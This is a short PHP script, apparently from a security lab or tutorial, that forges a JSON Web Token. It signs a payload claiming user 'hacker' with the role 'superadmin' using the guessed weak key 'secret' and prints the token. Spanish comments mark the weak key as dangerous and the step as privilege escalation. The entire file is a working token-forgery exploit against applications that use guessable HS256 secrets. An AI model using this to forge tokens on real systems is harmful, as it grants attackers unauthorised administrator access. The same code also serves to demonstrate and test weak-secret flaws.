<?php
require 'vendor/autoload.php';
use Firebase\JWT\JWT;
$key = "secret"; //Clave débil (peligroso en producción)
$payload = [
"user" => "hacker",
"role" => "superadmin" //Escalando privilegios
];
$new_jwt = JWT::encode($payload, $key, "HS256");
echo "Nuevo JWT modificado:\n" . $new_jwt;
?>
